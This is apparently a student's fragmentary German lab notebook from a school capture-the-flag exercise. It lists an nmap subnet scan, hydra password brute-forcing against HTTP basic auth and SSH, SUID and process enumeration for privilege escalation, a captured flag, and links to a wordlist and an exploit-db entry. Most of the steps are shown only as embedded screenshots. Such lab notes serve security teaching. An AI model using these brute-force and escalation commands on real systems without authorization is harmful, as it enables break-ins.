---
tags:
  - 3te_Klasse
  - itsi
---
`nmap 192.168.56.0/24`
mit allen ports
-T4 damit keine firewallfaxen
![[Pasted image 20250117175643.png]]
![[Pasted image 20250117175813.png]]
![[Pasted image 20250117175921.png]]
![[Pasted image 20250117180005.png]]
![[Pasted image 20250117180023.png]]
![[Pasted image 20250117180037.png]]
![[Pasted image 20250117180113.png]]
![[Pasted image 20250117180209.png]]
![[Pasted image 20250117180747.png]]
![[Pasted image 20250117180729.png]]
![[Pasted image 20250117181656.png]]
python file für proof zeigen
github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
`hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /`
![[Pasted image 20250117182116.png]]
![[Pasted image 20250117182208.png]]
`FLAG{use_secure_credentials}`
![[Pasted image 20250117183032.png]]
![[Pasted image 20250117183014.png]]
![[Pasted image 20250117183153.png]]
![[Pasted image 20250117183736.png]]
`ls -R *`
![[Pasted image 20250117190434.png]]
![[Pasted image 20250117191517.png]]
![[Pasted image 20250117191545.png]]
`hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4`
`find -perm -4000 2> /dev/null`
![[Pasted image 20250117195129.png]]
`cat /proc/741/cmdline`
`find -name "ctf_server.py" 2> /dev/null`
https://superuser.com/questions/632979/if-i-know-the-pid-number-of-a-process-how-can-i-get-its-name
![[Pasted image 20250117202527.png]]
https://medium.com/techiepedia/series-of-ctf-machines-walkthrough-4-linux-privilege-escalation-enumeration-247899027be
`ls -R * 2>dev/null| grep -i flag`
`cat /usr/local/bin/flag_process.sh`
![[Pasted image 20250117204436.png]]
![[Pasted image 20250117211103.png]]
![[Pasted image 20250117211250.png]]
![[Pasted image 20250117211407.png]]
![[Pasted image 20250117211426.png]]
https://www.exploit-db.com/exploits/42274